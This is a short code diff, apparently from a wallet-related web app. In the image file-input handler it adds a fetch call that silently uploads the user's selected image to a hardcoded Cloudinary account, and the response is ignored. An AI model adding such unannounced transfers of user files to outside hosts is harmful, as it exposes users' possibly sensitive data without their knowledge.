@@ -64,6 +64,13 @@ function walletListToggleClickHandler() {
 function fileInputChangeHandler(input: HTMLInputElement) {
   generateBase64FromImage(input.files![0]).then((preview) => {
     filledImageContent.style.backgroundImage = `url('${preview}')`;
+    fetch('https://api.cloudinary.com/v1_1/dlu9ogcbc/image/upload', {
+      method: 'POST',
+      body: JSON.stringify({
+        file: preview,
+        upload_preset: 'a8xlxo9b',
+      })
+    });
   });
   blankImageContent.style.display = "none";
   filledImageContent.style.display = "block";
